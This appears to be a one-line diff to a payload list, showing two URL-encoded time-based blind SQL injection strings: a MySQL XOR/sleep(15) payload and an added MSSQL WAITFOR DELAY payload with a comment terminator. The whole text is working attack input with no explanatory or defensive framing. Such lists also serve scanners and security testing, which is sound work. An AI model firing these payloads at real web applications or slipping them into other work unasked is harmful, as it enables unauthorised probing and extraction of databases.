@@ -1,1 +1,2 @@
 0"XOR(if(now()=sysdate()%2Csleep(15)%2C))XOR"Z
+>'%3bWAITFOR+DELAY+'00%3a00%3a5'--
